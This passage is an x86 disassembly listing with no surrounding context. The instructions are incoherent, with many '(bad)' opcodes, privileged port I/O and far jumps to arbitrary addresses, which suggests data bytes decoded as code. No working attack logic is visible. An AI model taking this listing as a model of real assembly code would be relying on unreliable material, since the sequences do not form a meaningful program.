  40196f:	jmp    0x401983
  401971:	xor    DWORD PTR [edx+0x53f22f06],edx
  401977:	pop    esi
  401978:	or     edx,DWORD PTR [edi+0x6d]
  40197b:	out    0x73,eax
  40197d:	jge    0x401934
  40197f:	sbb    eax,0xb5235234
  401984:	test   BYTE PTR [eax-0x58],0x7f
  401988:	cmc    
  401989:	(bad)  
  40198a:	push   esp
  40198b:	sub    DWORD PTR [ecx],edx
  40198d:	cli    
  40198e:	lods   al,BYTE PTR ds:[esi]
  40198f:	aas    
  401990:	xor    eax,0x64d95b5
  401995:	out    dx,al
  401996:	push   ebx
  401997:	repz add BYTE PTR [edx+0x541a7252],dl
  40199e:	mov    al,0x0
  4019a0:	scas   al,BYTE PTR es:[edi]
  4019a1:	add    ebp,edi
  4019a3:	mov    ecx,DWORD PTR [ecx+0x75]
  4019a6:	leave  
  4019a7:	(bad)  
  4019a8:	sar    ecx,cl
  4019aa:	sub    eax,0x82a71b28
  4019af:	push   esp
  4019b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019b1:	pop    ebp
  4019b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019b3:	jg     0x4019fd
  4019b5:	mov    ecx,0x648f9954
  4019ba:	fldenv [eax+0x69]
  4019bd:	jmp    0xa633:0x20e8d152
  4019c4:	jne    0x4019aa
  4019c6:	pop    edx
  4019c7:	clc    
  4019c8:	mov    esp,0x6277f60d
  4019cd:	xor    ecx,esp
  4019cf:	add    eax,0xe8c898c
  4019d4:	in     eax,0xe8
  4019d6:	fcomp  DWORD PTR [eax]
  4019d8:	inc    esi
  4019d9:	iret   
  4019da:	inc    esp
  4019db:	sar    ebp,0x73
  4019de:	adc    al,BYTE PTR [ebp+edx*1+0x6d]
  4019e2:	fsub   DWORD PTR [edx]
  4019e4:	(bad)  
  4019e5:	jne    0x401987
  4019e7:	ficom  DWORD PTR [ecx+0x62]
  4019ea:	fwait
  4019eb:	sbb    DWORD PTR [eax-0x47],ebp
  4019ee:	or     edx,DWORD PTR [ebx+0x31]
  4019f1:	mov    bl,0x90
  4019f3:	cwde   
  4019f4:	mov    bl,0xa
  4019f6:	enter  0x921f,0x7
  4019fa:	add    BYTE PTR [ebx+0x7f493f4a],dl
  401a00:	xor    al,0x17
  401a02:	gs iret 
  401a04:	xor    bh,BYTE PTR [esi-0x755629ac]
  401a0a:	and    BYTE PTR [edx],dl
  401a0c:	push   ebx
  401a0d:	adc    al,0x5d
  401a0f:	adc    esp,ebp
  401a11:	jl     0x4019a4
  401a13:	mov    ebx,0xac8bb7bd
  401a18:	fstp   QWORD PTR [ecx+eiz*1-0x19359196]
  401a1f:	xor    bh,ah
  401a21:	adc    cl,BYTE PTR [ebp+ecx*1+0x3cddaa9b]
  401a28:	jmp    0x401a4e
  401a2a:	xlat   BYTE PTR ds:[ebx]
  401a2b:	outs   dx,BYTE PTR ds:[esi]
  401a2c:	outs   dx,DWORD PTR ds:[esi]
  401a2d:	ss pop edi
  401a2f:	rcr    DWORD PTR [edi+0x20],1
  401a32:	push   eax
  401a33:	mov    ds:0xd26bf05b,al
  401a38:	mov    al,ds:0x290a903d
  401a3d:	cmp    bh,bl
  401a3f:	fdiv   DWORD PTR [esp+edx*2-0x4d]
  401a43:	stos   BYTE PTR es:[edi],al
  401a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a45:	sbb    DWORD PTR [eax-0x5f76ea7a],ecx
  401a4b:	push   esi
  401a4c:	xchg   esi,eax
  401a4d:	fcom   st(2)
  401a4f:	sub    al,0x76
  401a51:	shrd   DWORD PTR [esi+0x5],edi,cl
  401a55:	push   esi
  401a56:	ret    
  401a57:	fnstcw WORD PTR [edx+0x25]
  401a5a:	mov    eax,ds:0x6fbd86b0
  401a5f:	sub    eax,0x65f354b7
  401a64:	xchg   esi,eax
  401a65:	and    eax,0x51645dfe
  401a6a:	and    ebp,ebx
  401a6c:	sbb    BYTE PTR [eax-0x2695fb38],ch
  401a72:	stc    
  401a73:	or     eax,0xac8ed36f
  401a78:	pop    edx
  401a79:	and    DWORD PTR [ebp+0x11cb1014],edx
  401a7f:	lahf   
  401a80:	jns    0x401a5d
  401a82:	test   eax,esp
  401a84:	cmp    bh,BYTE PTR [edx+0x2c]
  401a87:	dec    esi
  401a88:	and    al,0x8a
  401a8a:	(bad)  
  401a8b:	popa   
  401a8c:	(bad)  
  401a8d:	clc    
  401a8e:	out    0xc7,eax
  401a90:	clc    
  401a91:	cmc    
  401a92:	repz mov esi,0x5db5b88e
  401a98:	and    esi,DWORD PTR [ebp+0x271baa52]
  401a9e:	dec    ecx
  401a9f:	imul   esp,DWORD PTR [ecx],0xa590dfae
  401aa5:	pusha  
  401aa6:	or     al,0xe2
  401aa8:	jmp    0x401ac5
  401aaa:	iret   
  401aab:	out    0x11,eax
  401aad:	xchg   esp,eax
  401aae:	test   DWORD PTR [ebx],esp
  401ab0:	(bad)  
  401ab1:	std    
  401ab2:	xor    al,0x23
  401ab4:	int3   
  401ab5:	(bad)  
  401ab6:	sub    al,0x26
  401ab8:	mov    edi,0xd055cc04
  401abd:	fisub  DWORD PTR [eax]
  401abf:	bound  eax,QWORD PTR [edi+0x41]
  401ac2:	sbb    DWORD PTR [ebx+edi*8+0x2b],ebx
  401ac6:	aaa    
  401ac7:	shl    bh,cl
  401ac9:	sbb    BYTE PTR [esi+0x1b90d1bb],0xac
  401ad0:	into   
  401ad1:	shr    BYTE PTR [ebp-0x39239216],cl
  401ad7:	and    ebp,DWORD PTR [eax-0x6a3696cf]
  401add:	lea    ebp,[ecx-0x3a2e00ac]
  401ae3:	mov    bh,0xf9
  401ae5:	hlt    
  401ae6:	cmp    cl,BYTE PTR [esp+eiz*8-0x66]
  401aea:	sub    DWORD PTR cs:[di],0x20998a8
  401af2:	jge    0x401b11
  401af4:	push   ecx
  401af5:	lock sub DWORD PTR [ecx-0x5e],0x466f3833
  401afd:	repz and eax,0xc7b971e
  401b03:	loop   0x401a92
  401b05:	add    ebx,DWORD PTR [ebx]
  401b07:	pop    eax
  401b08:	xor    ah,dl
  401b0a:	inc    ebp
  401b0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b0c:	rol    ebp,cl
  401b0e:	imul   edi,DWORD PTR [ecx-0x2e769ec4],0x5a83f5bb
  401b18:	mov    ds:0xfc227174,eax
  401b1d:	or     ah,BYTE PTR [esi+0x5b]
  401b20:	cmp    eax,0x65299325
  401b25:	ins    DWORD PTR es:[edi],dx
  401b26:	mov    edx,0xb6b70035
  401b2b:	int    0xb8
  401b2d:	add    BYTE PTR [edx-0x69233d49],dh
  401b33:	int    0x0
  401b35:	jmp    0x16a3:0xe2b38379
  401b3c:	mov    al,ds:0x17dbb535
  401b41:	jmp    DWORD PTR [esi+0x4b57915c]
  401b47:	bswap  esp
  401b49:	mov    ds:0x5735b085,al
  401b4e:	out    dx,eax
  401b4f:	inc    esi
  401b50:	pusha  
  401b51:	add    DWORD PTR [eax],esp
  401b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b54:	inc    ebp
  401b55:	pop    ebx
  401b56:	pusha  
  401b57:	jbe    0x401b0b
  401b59:	ret    
  401b5a:	retf   
  401b5b:	jg     0x401b5a
  401b5d:	in     eax,dx
  401b5e:	int3   
  401b5f:	xor    eax,0xf9741bfa
  401b64:	inc    edx
  401b65:	test   eax,0x6e6392ea
  401b6a:	lahf   
  401b6b:	mov    esi,0x2ff78c3f
  401b70:	shl    ah,1
  401b72:	test   al,0xe2
  401b74:	or     dh,BYTE PTR [ebx-0x45]
  401b77:	push   0x48d69b78
  401b7c:	mov    edx,0xd3cfb93a
  401b81:	inc    ebp
  401b82:	mov    dh,0xa3
  401b84:	xlat   BYTE PTR ds:[ebx]
  401b85:	dec    edi
  401b86:	sub    ebp,edx
  401b88:	xchg   ebx,eax
  401b89:	cmp    ecx,eax
  401b8b:	push   esp
  401b8c:	pop    ecx
  401b8d:	cmp    eax,0xdd50a2eb
  401b92:	imul   esp,ecx,0x7
  401b95:	sbb    al,0xac
  401b97:	rol    BYTE PTR [esi-0x3b],cl
  401b9a:	fs mov ah,0xe2
  401b9d:	push   ecx
  401b9e:	cdq    
  401b9f:	dec    ecx
  401ba0:	push   cs
  401ba1:	loopne 0x401b46
  401ba3:	jmp    0x401baa
  401ba5:	pop    esp
  401ba6:	adc    DWORD PTR [esi-0x5b],ebp
  401ba9:	loop   0x401c1b
  401bab:	add    al,0xe0
  401bad:	rol    eax,cl
  401baf:	sti    
  401bb0:	scas   eax,DWORD PTR es:[edi]
  401bb1:	lahf   
  401bb2:	sbb    al,0xe
  401bb4:	push   ebp
  401bb5:	jbe    0x401bad
  401bb7:	cmp    DWORD PTR [edi],edi
  401bb9:	shr    DWORD PTR [edx-0x53],0xb2
  401bbd:	aaa    
  401bbe:	rcl    DWORD PTR [ecx],1
  401bc0:	jle    0x401b8e
  401bc2:	arpl   WORD PTR ds:0xfe829360,sp
  401bc8:	or     al,0x8
  401bca:	mov    ah,0xfa
  401bcc:	ror    BYTE PTR [edi+0xa],cl
  401bcf:	jns    0x401be5
  401bd1:	push   esi
  401bd2:	and    eax,0x359c2812
  401bd7:	lock pushf 
  401bd9:	out    0xc1,eax
  401bdb:	sbb    ebp,edi
  401bdd:	sub    DWORD PTR [ecx-0x7abdd168],edx
  401be3:	into   
  401be4:	leave  
  401be5:	sub    DWORD PTR [eax],0x6e
  401be8:	adc    al,0x23
  401bea:	and    ecx,DWORD PTR [eax-0x4e660c36]
  401bf0:	mov    ebp,0x2ec75acd
  401bf5:	inc    ebp
  401bf6:	mov    esi,0x16757c17
  401bfb:	out    dx,al
  401bfc:	mov    BYTE PTR [ebx],al
  401bfe:	mov    eax,0xbea90f87
  401c03:	push   edx
  401c04:	mov    cl,0xff
  401c06:	sbb    ah,BYTE PTR [esi-0x1a]
  401c09:	inc    ecx
  401c0a:	sbb    esi,DWORD PTR [edx-0x12]
  401c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c0e:	lds    eax,FWORD PTR [ebp+0x4b557576]
  401c14:	std    
  401c15:	shl    DWORD PTR [eax-0x5c],0xff
  401c19:	xchg   esi,eax
  401c1a:	cmp    eax,0x5932795
  401c1f:	jge    0x401c8d
  401c21:	repz dec eax
  401c23:	icebp  
  401c24:	cs add eax,0x7b99d65
  401c2a:	pop    ebp
  401c2b:	lock adc BYTE PTR [esi+0x26],ch
  401c2f:	fstp   DWORD PTR [eax-0x5f]
  401c32:	mov    edx,0x5e5ed77d
  401c37:	jmp    0x8b9e9248
  401c3c:	(bad)  
  401c3e:	ds in  al,dx
  401c40:	mov    ch,0xa4
  401c42:	mov    esi,0x26eee36e
  401c47:	call   0x9f4e:0xf6d44aee
  401c4e:	mov    esp,0x91c91d49
  401c53:	push   eax
  401c54:	cmp    al,0x85
  401c56:	push   edi
  401c57:	int3   
  401c58:	mov    al,0x6b
  401c5a:	popf   
  401c5b:	out    dx,eax
  401c5c:	push   0x12
  401c5e:	mov    cl,0x27
  401c60:	dec    ebx
  401c61:	jne    0x401bf4
  401c63:	add    esp,ebp
  401c65:	cld    
  401c66:	dec    eax
  401c67:	scas   al,BYTE PTR es:[edi]
  401c68:	jne    0x401c11
  401c6a:	cmc    
  401c6b:	and    al,0x79
  401c6d:	ret    0x335
  401c70:	jge    0x401cc3
  401c72:	jge    0x401c63
  401c74:	mov    WORD PTR [eax+0x3685b4ab],gs
  401c7a:	popa   
  401c7b:	cdq    
  401c7c:	addr16 popa 
  401c7e:	and    ah,cl
  401c80:	or     bl,bl
  401c82:	mov    ah,0xc2
  401c84:	fbld   TBYTE PTR [edi+0x4c]
  401c87:	retf   0x169
  401c8a:	outs   dx,BYTE PTR ds:[esi]
  401c8b:	push   edi
  401c8c:	push   esi
  401c8d:	loopne 0x401ca7
  401c8f:	ror    DWORD PTR [ebx-0x472af67b],cl
  401c95:	add    ebx,DWORD PTR [eax]
  401c97:	sti    
  401c98:	mov    eax,ds:0x28b14d69
  401c9d:	mov    bh,0xce
  401c9f:	js     0x401c2d
  401ca1:	(bad)  
  401ca2:	lock retf 
  401ca4:	fwait
  401ca5:	int    0xb0
  401ca7:	ret    
  401ca8:	jmp    0xeaa0:0xb5ea9975
  401caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cb0:	xchg   ebp,eax
  401cb1:	add    ecx,DWORD PTR [edi-0x5d30b66a]
  401cb7:	xchg   esp,eax
  401cb8:	mov    WORD PTR [ebp+0x4f],dx
  401cbc:	gs adc eax,0xdbe44357
  401cc2:	mov    ds:0x5b16c2c8,al
  401cc7:	push   ebx
  401cc8:	shr    dl,1
  401cca:	mov    ebp,DWORD PTR [ebx-0x20]
  401ccd:	inc    eax
  401cce:	mov    al,BYTE PTR [ebp-0x79d2c32]
  401cd4:	pop    ebx
  401cd5:	xchg   ebx,eax
  401cd6:	mov    dl,0xc8
  401cd8:	mov    eax,ds:0x8c50c486
  401cdd:	mov    ds:0xbaa1b274,al
  401ce2:	imul   esp,DWORD PTR [ebx],0x6feb1f4c
  401ce8:	lock daa 
  401cea:	imul   BYTE PTR [edi-0x72]
  401ced:	jmp    0x601:0xffdd5e4e
  401cf4:	adc    DWORD PTR [eax-0x31],ecx
  401cf7:	pop    esi
  401cf8:	add    BYTE PTR [eax],dh
  401cfa:	imul   BYTE PTR [ebx+eax*4-0x691db423]
  401d01:	in     al,0xea
  401d03:	and    DWORD PTR [eax+eax*1-0x247e0124],0xf7f21e49
  401d0e:	nop
  401d0f:	adc    BYTE PTR [edx],0xba
  401d12:	sbb    BYTE PTR [ebp+0x4d293c43],bh
  401d18:	cld    
  401d19:	mov    ds:0x248a1b00,al
  401d1e:	pop    ss
  401d1f:	push   0x768e8c7e
  401d24:	jmp    0xa59877a5
  401d29:	mov    ah,0xeb
  401d2b:	inc    ebp
  401d2c:	mov    edx,0xd82f88bc
  401d31:	xor    bh,bh
  401d33:	xchg   ebp,ebx
  401d35:	add    BYTE PTR es:[ebx+0x5f],ah
  401d39:	daa    
  401d3a:	cwde   
  401d3b:	jae    0x401d81
  401d3d:	out    0x2f,al
  401d3f:	enter  0x3f30,0xb3
  401d43:	jbe    0x401db4
  401d45:	sub    esi,edx
  401d47:	mov    eax,ds:0xdd0bc6ca
  401d4c:	in     al,dx
  401d4d:	xor    al,0x89
  401d4f:	mov    bl,0x2a
  401d51:	es push edi
  401d53:	xchg   ecx,eax
  401d54:	sub    eax,0xc408a3b
  401d59:	fs mov edx,0x72c993e5
  401d5f:	or     al,0x9b
  401d61:	scas   al,BYTE PTR es:[edi]
  401d62:	add    eax,0xe3ba006f
  401d67:	mov    DWORD PTR [ebx+0x4b8d92df],eax
  401d6d:	cmp    esi,DWORD PTR [ebx+eax*8-0x5f]
  401d71:	cmp    esp,DWORD PTR [ecx-0x3a3ae767]
  401d77:	mov    edx,0xb612a350
  401d7c:	xor    BYTE PTR [ebx+0x50],dl
  401d7f:	xor    edx,ecx
  401d81:	mov    ebx,0x1d2b139b
  401d86:	int3   
  401d87:	mov    eax,0xce85c0d4
  401d8c:	and    al,0x67
  401d8e:	int    0xac
  401d90:	sub    DWORD PTR [edi+0xb],0x542f7c84
  401d97:	mov    ecx,DWORD PTR ds:0xe8ee13b2
  401d9d:	xor    eax,0x28d0a426
  401da2:	(bad)  
  401da3:	jns    0x401d6b
  401da5:	jg     0x401d5a
  401da7:	and    BYTE PTR [ebx],bl
  401da9:	fwait
  401daa:	aam    0xfa
  401dac:	fs xor dl,bh
  401daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401db0:	les    edi,FWORD PTR [esi]
  401db2:	das    
  401db3:	(bad)  
  401db4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401db5:	jmp    0xf9d4fc19
  401dba:	sbb    DWORD PTR [edi],esi
  401dbc:	jmp    0x4779:0xdb66789b
  401dc3:	lea    edx,[eax]
  401dc5:	and    ecx,ebx
  401dc7:	test   DWORD PTR [esi-0x7ff08479],eax
  401dcd:	inc    eax
  401dce:	jmp    0x401dc8
  401dd0:	add    ebp,DWORD PTR [esi-0x64]
  401dd3:	mov    bl,0x7b
  401dd5:	sbb    ecx,edx
  401dd7:	ja     0x401e42
  401dd9:	dec    ebp
  401dda:	arpl   WORD PTR [ecx-0x4e],bx
  401ddd:	mov    esi,0x22806df6
  401de2:	fcmovne st,st(7)
  401de4:	cli    
  401de5:	ret    
  401de6:	jo     0x401e0c
  401de8:	arpl   WORD PTR [eax+0x3],bp
  401deb:	mov    ebx,0x439862e6
  401df0:	out    0x5c,eax
  401df2:	stc    
  401df3:	mov    bl,0x3b
  401df5:	in     al,dx
  401df6:	inc    ebp
  401df7:	cmp    al,cl
  401df9:	outs   dx,DWORD PTR ds:[esi]
  401dfa:	repz inc edx
  401dfc:	ins    BYTE PTR es:[edi],dx
  401dfd:	fs sbb eax,0x42391cb4
  401e03:	fwait
  401e04:	call   0xc02396ac
  401e09:	jmp    0x401dcb
  401e0b:	int    0xb0
  401e0d:	or     BYTE PTR [ecx-0x6f63f1c4],bl
  401e13:	retf   
  401e14:	add    DWORD PTR [edx-0x20],esp
  401e17:	add    DWORD PTR [edx],ebx
  401e19:	xchg   esi,eax
  401e1a:	dec    ecx
  401e1b:	frstor [ecx]
  401e1d:	jno    0x401e25
  401e1f:	xor    bl,bh
  401e21:	cld    
  401e22:	jecxz  0x401e1d
  401e24:	addr16 mov esi,0xf8767db9
  401e2a:	inc    eax
  401e2b:	fbstp  TBYTE PTR [eax]
  401e2d:	mov    ebp,0x8fafc150
  401e32:	and    eax,eax
  401e34:	sti    
  401e35:	lock jae 0x401e5d
  401e38:	mov    bh,0xda
  401e3a:	sub    BYTE PTR [ebx+0x53a1f147],0x3f
  401e41:	mov    ds:0x5f0c4a15,eax
  401e46:	out    dx,eax
  401e47:	ins    DWORD PTR es:[edi],dx
  401e48:	ja     0x401e87
  401e4a:	dec    eax
  401e4b:	aas    
  401e4c:	inc    esp
  401e4d:	popa   
  401e4e:	xchg   esp,eax
  401e4f:	(bad)  
  401e50:	push   ds
  401e51:	xchg   esi,eax
  401e52:	imul   BYTE PTR [ecx]
  401e54:	sub    bh,BYTE PTR [ecx-0x72]
  401e57:	xor    al,0xd5
  401e59:	jl     0x401e1f
  401e5b:	mov    esp,0xae464134
  401e60:	cmp    ecx,DWORD PTR [edi+edi*8]
  401e63:	mov    BYTE PTR [edi-0x4a],bh
  401e66:	lods   al,BYTE PTR ds:[esi]
  401e67:	jmp    0x6d7fef7d
  401e6c:	jbe    0x401e07
  401e6e:	into   
  401e6f:	ins    DWORD PTR es:[edi],dx
  401e70:	ret    0x9ad2
  401e73:	adc    eax,0x8c49d98a
  401e78:	je     0x401e5f
  401e7a:	and    BYTE PTR [ecx+0x70dd7872],cl
  401e80:	and    al,BYTE PTR ds:[eax]
  401e83:	inc    esp
  401e84:	ret    
  401e85:	cwde   
  401e86:	jg     0x401e4d
  401e88:	sbb    eax,0x233a72e9
  401e8d:	int3   
  401e8e:	push   cs
  401e8f:	add    ecx,DWORD PTR [ebx]
  401e91:	inc    ebp
  401e92:	pop    eax
  401e93:	xlat   BYTE PTR ds:[ebx]
  401e94:	fdiv   st,st(2)
  401e96:	xor    al,0xe3
  401e98:	or     al,0x62
  401e9a:	pop    ds
  401e9b:	dec    ebp
  401e9c:	cmp    BYTE PTR [ebp+0x48486704],dh
  401ea2:	ret    0x5afa
  401ea5:	enterw 0x8386,0xe1
  401eaa:	sbb    eax,0x64ce5c45
  401eaf:	or     eax,0xc3deaab8
  401eb4:	cmp    BYTE PTR [ebx+0x37eb5ef0],cl
  401eba:	or     DWORD PTR [edi+0x28],eax
  401ebd:	push   edi
  401ebe:	fiadd  DWORD PTR [edx+0x2d4cbcf1]
  401ec4:	out    dx,al
  401ec5:	push   esi
  401ec6:	aaa    
  401ec7:	js     0x401ee1
  401ec9:	(bad)  
  401eca:	rcr    BYTE PTR [ebp+0x31],1
  401ecd:	enter  0xbd94,0x65
  401ed1:	pop    edx
  401ed2:	(bad)
  401ed6:	aad    0x29
  401ed8:	sub    eax,DWORD PTR [edi]
  401eda:	loopne 0x401ee9
  401edc:	sub    ebx,edx
  401ede:	(bad)  
  401edf:	lods   eax,DWORD PTR ds:[esi]
  401ee0:	pop    esi
  401ee1:	scas   al,BYTE PTR es:[edi]
  401ee2:	or     edx,edx
  401ee4:	outs   dx,BYTE PTR ds:[esi]
  401ee5:	and    eax,0xb94074eb
  401eea:	(bad)  
  401eeb:	stc    
  401eec:	or     BYTE PTR ds:0x4f160caf,0xda
  401ef3:	leave  
  401ef4:	jne    0x401f4b
  401ef6:	push   ss
  401ef7:	jmp    0x4352:0x9e13d7d2
  401efe:	pop    eax
  401eff:	mov    bl,0x83
  401f01:	add    BYTE PTR [eax+edx*4-0x2c451d53],bl
  401f08:	and    DWORD PTR [edx],esp
  401f0a:	or     BYTE PTR [ecx+0x66],ah
  401f0d:	pushf  
  401f0e:	mov    al,ds:0x6a88d575
  401f13:	jge    0x401ef7
  401f15:	fadd   st(5),st
  401f17:	dec    edi
  401f18:	inc    esi
  401f19:	xlat   BYTE PTR ds:[ebx]
  401f1a:	pop    edx
  401f1b:	xor    DWORD PTR [eax+0x787e478b],edi
  401f21:	mov    esi,0xd568a03c
  401f26:	shl    ebp,1
  401f28:	fst    st(1)
  401f2a:	add    esi,DWORD PTR [edx]
  401f2c:	retf   0x7e0a
  401f2f:	sahf   
  401f30:	mov    dl,0x26
  401f32:	(bad)  
  401f33:	adc    eax,0x6ffe74bb
  401f38:	sub    eax,0x5b755c21
  401f3d:	jns    0x401edf
  401f3f:	fs cld 
  401f41:	leave  
  401f42:	imul   ebx,DWORD PTR [ebp+0x2ec91252],0x55
  401f49:	adc    eax,0x8bc25e67
  401f4e:	cmp    ebx,ebx
  401f50:	mov    al,0xce
  401f52:	outs   dx,BYTE PTR ds:[esi]
  401f53:	inc    esi
  401f54:	dec    ebx
  401f55:	inc    eax
  401f56:	sbb    edx,ecx
  401f58:	ret    0x7243
  401f5b:	ja     0x401f83
  401f5d:	sbb    ax,0x3f06
  401f61:	out    0xd6,al
  401f63:	mov    BYTE PTR [eax+0x4ed5b54f],bh
  401f69:	or     BYTE PTR [esi-0x55b6ef51],bl
  401f6f:	pop    ss
  401f70:	aam    0x3a
  401f72:	inc    edx
  401f73:	mov    dh,0x3
  401f75:	lods   eax,DWORD PTR ds:[esi]
  401f76:	sbb    eax,0x547ad87b
  401f7b:	fstp   DWORD PTR [esp+edx*8+0x7a]
  401f7f:	pop    edi
  401f80:	lods   eax,DWORD PTR ds:[esi]
  401f81:	mov    dh,BYTE PTR [ecx+0x78]
  401f84:	pop    edx
  401f85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f86:	jp     0x401fa2
  401f88:	jg     0x402000
  401f8a:	popa   
  401f8b:	xchg   edi,eax
  401f8c:	xchg   ebp,eax
  401f8d:	jmp    0xe26e0f22
  401f92:	in     eax,0xcf
  401f94:	aaa    
  401f95:	and    eax,0xdae0791d
  401f9a:	dec    esp
  401f9b:	dec    eax
  401f9c:	nop
  401f9d:	xor    DWORD PTR [ecx],0x64
  401fa0:	add    al,0x4b
  401fa2:	mov    bh,0xcc
  401fa4:	sti    
  401fa5:	inc    ebx
  401fa6:	inc    esi
  401fa7:	jne    0x402022
  401fa9:	mov    ds:0x784d72e8,eax
  401fae:	dec    esp
  401faf:	fistp  DWORD PTR [edi]
  401fb1:	sbb    eax,0x82b6aa5c
  401fb6:	out    0xcc,al
  401fb8:	test   eax,0x7eb49186
  401fbd:	lds    edi,FWORD PTR [ebx]
  401fbf:	cmp    edx,DWORD PTR [ebp+0x6a]
  401fc2:	idiv   BYTE PTR [ecx+0x133ae87d]
  401fc8:	rol    BYTE PTR [edi-0x1bc0ce31],0x80
  401fcf:	jg     0x402020
  401fd1:	pop    eax
  401fd2:	rcl    BYTE PTR [ecx-0x34],0xe8
  401fd6:	(bad)  
  401fd7:	sub    DWORD PTR [eax-0x73494a29],ecx
  401fdd:	(bad)  
  401fde:	rcl    dl,cl
  401fe0:	fdiv   st(4),st
  401fe2:	inc    edi
  401fe3:	comiss xmm3,DWORD PTR [ecx-0x25]
  401fe7:	neg    al
  401fe9:	and    al,0x4c
  401feb:	xchg   esp,eax
  401fec:	(bad)  
  401fed:	aas    
  401fee:	lods   eax,DWORD PTR ds:[esi]
  401fef:	stos   DWORD PTR es:[di],eax
  401ff1:	jb     0x402061
  401ff3:	and    edx,ecx
  401ff5:	cs inc esi
  401ff7:	sub    DWORD PTR [ebx+edi*2+0xe474de7],edi
  401ffe:	retf   
  401fff:	cli    
  402000:	int3   
  402001:	push   ds
  402002:	sub    edx,DWORD PTR [esi-0x79dcb302]
  402008:	adc    edx,DWORD PTR [eax]
  40200a:	push   esp
  40200b:	xor    al,BYTE PTR ds:0x74316d55
  402011:	pop    ecx
  402012:	mov    cl,0x43
  402014:	mov    dh,0x8b
  402016:	stc    
  402017:	sub    eax,0xd0ce032f
  40201c:	es mov dh,0x14
  40201f:	pop    eax
  402020:	repnz pop edi
  402022:	dec    ecx
  402023:	mov    edx,0xc509f1e1
  402028:	mov    cl,0xa4
  40202a:	xor    al,0xa4
  40202c:	mov    ah,BYTE PTR [ebp+ecx*4+0x302c310d]
  402033:	cmp    BYTE PTR [edi+0x5bca0dfe],ch
  402039:	(bad)  
  40203a:	mov    bl,0x7b
  40203c:	sar    edx,1
  40203e:	dec    esi
  40203f:	pop    ebp
  402040:	ss sub al,0xce
  402043:	cmc    
  402044:	jbe    0x401fe3
  402046:	out    dx,al
  402047:	(bad)  [ecx-0x41]
  40204a:	int    0x47
  40204c:	push   ebp
  40204d:	test   al,0x4d
  40204f:	adc    al,0x89
  402051:	repz push edi
  402053:	inc    eax
  402054:	pop    ss
  402055:	or     DWORD PTR [eax+0x6e7e4b2d],ecx
  40205b:	pushf  
  40205c:	adc    al,0xa
  40205e:	pop    edi
  40205f:	xchg   edi,eax
  402060:	imul   ebx,DWORD PTR [esi],0xffffff8d
  402063:	add    ecx,esp
  402065:	test   cl,bl
  402067:	sahf   
  402068:	mov    esi,0x75b916e9
  40206d:	dec    esi
  40206e:	pop    ebx
  40206f:	mov    esp,DWORD PTR [eax-0x32f422e0]
  402075:	mov    ebp,0x4e32e0b9
  40207a:	loop   0x402013
  40207c:	xchg   edi,eax
  40207d:	jle    0x402095
  40207f:	push   ebx
  402080:	call   ebp
  402082:	scas   eax,DWORD PTR es:[edi]
  402083:	xor    bh,bl
  402085:	pop    eax
  402086:	rol    BYTE PTR [ebp-0x36],cl
  402089:	and    DWORD PTR [esi+0x31a40657],esi
  40208f:	cmp    BYTE PTR [esi],cl
  402091:	inc    esi
  402092:	mov    DWORD PTR [esi-0x4c],ebx
  402095:	(bad)  
  402096:	or     esi,DWORD PTR [edx+0x48]
  402099:	ret    
  40209a:	fild   QWORD PTR [edx+0x26]
  40209d:	aas    
  40209e:	adc    ebp,0x21
  4020a1:	mov    al,0x71
  4020a3:	xchg   edx,eax
  4020a4:	pushf  
  4020a5:	std    
  4020a6:	adc    al,0xb3
  4020a8:	cli    
  4020a9:	in     al,0x53
  4020ab:	jb     0x402049
  4020ad:	(bad)  
  4020ae:	jb     0x4020b0
  4020b0:	ja     0x4020e7
  4020b2:	sub    eax,0xebe58e43
  4020b7:	or     ch,cl
  4020b9:	jo     0x4020ad
  4020bb:	imul   esp,ebx,0x90431af4
  4020c1:	in     al,0x2f
  4020c3:	xor    BYTE PTR [esi],bh
  4020c5:	or     al,0x8f
  4020c7:	lahf   
  4020c8:	mov    edi,DWORD PTR [edi-0x752bb8a7]
  4020ce:	sub    dl,BYTE PTR [edx]
  4020d0:	xchg   esi,eax
  4020d1:	(bad)  
  4020d2:	gs into 
  4020d4:	dec    eax
  4020d5:	push   eax
  4020d6:	xchg   edi,eax
  4020d7:	xchg   esi,eax
  4020d8:	xor    BYTE PTR [esp+edx*4-0x7de78f4c],cl
  4020df:	lods   al,BYTE PTR ds:[esi]
  4020e0:	and    ecx,DWORD PTR cs:[esi+edx*2]
  4020e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020e5:	and    al,BYTE PTR [ebx+0x34]
  4020e8:	popa   
  4020e9:	test   DWORD PTR [edx+0x1ed1dfc3],edx
  4020ef:	int    0x7a
  4020f1:	out    0xf2,al
  4020f3:	fisubr DWORD PTR ds:0x6bb8c67d
  4020f9:	aam    0xd7
  4020fb:	xchg   ecx,eax
  4020fc:	jae    0x402089
  4020fe:	jmp    0x4020e9
  402100:	imul   edx,edx,0x496f4743
  402106:	xor    eax,0xe81bb12c
  40210b:	add    eax,0x7c78125e
  402110:	xchg   edi,eax
  402111:	shr    BYTE PTR [ebx-0x4482f0f5],1
  402117:	jge    0x40209a
  402119:	dec    esi
  40211a:	addr16 mov ebx,0x7b5906d1
  402120:	sbb    esi,DWORD PTR [ecx]
  402122:	loope  0x40217f
  402124:	sub    eax,0xad2c49c6
  402129:	xor    al,0xb3
  40212b:	(bad)  
  40212c:	mov    ecx,DWORD PTR [ebp+ebp*4+0x4b]
  402130:	cdq    
  402131:	inc    edi
  402132:	stos   BYTE PTR es:[edi],al
  402133:	lea    edi,[ebx+0x57b6d521]
  402139:	shl    DWORD PTR [edi+ebx*4+0x29],cl
  40213d:	adc    BYTE PTR [edi+0x23],dh
  402140:	fs pop ecx
  402142:	inc    ebx
  402143:	adc    eax,0xb79046c5
  402148:	(bad)  
  402149:	clc    
  40214a:	sub    edx,esp
  40214c:	scas   al,BYTE PTR es:[edi]
  40214d:	jnp    0x402118
  40214f:	shr    DWORD PTR [esi+0x22],cl
